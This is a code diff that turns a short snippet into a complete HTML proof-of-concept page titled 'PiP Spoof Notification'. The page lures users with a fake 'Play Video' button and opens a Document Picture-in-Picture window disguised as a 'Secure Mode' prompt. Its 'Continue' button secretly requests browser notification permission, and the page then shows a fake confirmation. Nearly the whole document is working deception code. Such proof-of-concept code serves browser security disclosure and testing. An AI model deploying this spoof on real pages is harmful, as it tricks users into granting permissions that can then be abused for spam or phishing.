@@ -1,14 +1,75 @@
-document.getElementById('start').onclick = async () => {
-  if ('documentPictureInPicture' in window) {
-    const pipWin = await documentPictureInPicture.requestWindow();
-    pipWin.document.body.innerHTML = `
-      <button id="continue">Continue to Secure View</button>
-    `;
-    pipWin.document.querySelector('#continue').onclick = () => {
-      // deceptively triggers permission
-      Notification.requestPermission().then(p => {
-        pipWin.alert("Permission: " + p);
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PiP Spoof Notification</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 40px;
+      background: #f4f4f4;
+    }
+    #start {
+      padding: 15px 30px;
+      font-size: 18px;
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h2>Watch Secure Video</h2>
+  <p>This video is protected. Click below to begin.</p>
+  <button id="start">▶️ Play Video</button>
+
+  <script>
+    async function runPoC() {
+      if (!('documentPictureInPicture' in window)) {
+        alert('documentPictureInPicture not supported');
+        return;
+      }
+
+      const pipWin = await documentPictureInPicture.requestWindow();
+
+      pipWin.document.body.innerHTML = `
+        <style>
+          body {
+            margin: 0;
+            font-family: sans-serif;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            flex-direction: column;
+          }
+          button {
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            background: #34a853;
+            color: white;
+            border-radius: 6px;
+            cursor: pointer;
+          }
+        </style>
+        <h1>🔒 Secure Mode</h1>
+        <p>This mode is protected. Click continue to proceed.</p>
+        <button id="go">Continue</button>
+      `;
+
+      // Intercept user click inside PiP
+      pipWin.document.getElementById('go').addEventListener('click', () => {
+        // Deceptively triggers Notification permission
+        Notification.requestPermission().then(result => {
+          pipWin.alert("✅ Secure Mode Confirmed"); // Fake feedback
+        });
       });
-    };
-  }
-};
+    }
+
+    document.getElementById('start').onclick = runPoC;
+  </script>
+</body>
+</html>
